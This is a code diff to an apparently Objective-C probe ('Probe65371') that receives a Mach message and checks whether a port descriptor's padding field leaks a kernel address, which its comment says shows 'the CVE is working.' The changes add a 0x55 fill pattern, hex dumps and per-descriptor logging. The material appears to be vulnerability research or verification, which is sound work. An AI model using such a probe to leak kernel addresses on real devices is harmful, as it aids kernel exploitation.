@@ -98,7 +98,10 @@ static void *recv_thread(void *arg)
     free(ctx);
 
     uint8_t buf[4096] __attribute__((aligned(8)));
-    memset(buf, 0, sizeof(buf));
+    /* Fill with 0x55 (not 0) so we can distinguish "kernel never touched pad1"
+     * (0x55555555) from "kernel explicitly zeroed it" (0x00000000).
+     * If pad1 comes back as a kernel VA (0xfffffff0…) the CVE is working. */
+    memset(buf, 0x55, sizeof(buf));
     mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
 
     kern_return_t kr = mach_msg(hdr,
@@ -106,7 +109,20 @@ static void *recv_thread(void *arg)
                                 0, (mach_msg_size_t)sizeof(buf),
                                 recv, 12000, MACH_PORT_NULL);
 
-    NSLog(@"[Probe65371] recv_thread: mach_msg kr=0x%x", (unsigned)kr);
+    NSLog(@"[Probe65371] recv_thread: mach_msg kr=0x%x  msgh_size=%u",
+          (unsigned)kr, (unsigned)hdr->msgh_size);
+
+    /* Raw hex dump of the first 96 bytes so we can see exactly what the
+     * kernel wrote into the receive buffer (header + body + descriptors). */
+    if (hdr->msgh_size > 0 && hdr->msgh_size <= sizeof(buf)) {
+        mach_msg_size_t dump_len = hdr->msgh_size < 96 ? hdr->msgh_size : 96;
+        NSMutableString *hex = [NSMutableString stringWithCapacity:dump_len * 3 + 20];
+        for (mach_msg_size_t j = 0; j < dump_len; j++) {
+            if (j % 16 == 0) [hex appendFormat:@"\n  [%3u] ", j];
+            [hex appendFormat:@"%02x ", buf[j]];
+        }
+        NSLog(@"[Probe65371] recv raw bytes:%@", hex);
+    }
 
     id<ProbeResultProtocol> proxy = [conn remoteObjectProxy];
 
@@ -132,6 +148,8 @@ static void *recv_thread(void *arg)
             memcpy(&portname, buf + base,     4);
             memcpy(&pad1,     buf + base + 4, 4);
         }
+        NSLog(@"[Probe65371] desc[%u] raw: name=0x%08x pad1=0x%08x  (at buf[%zu..%zu])",
+              i, portname, pad1, base, base + 11);
         [pad1s addObject:@(pad1)];
         [names addObject:@(portname)];
     }
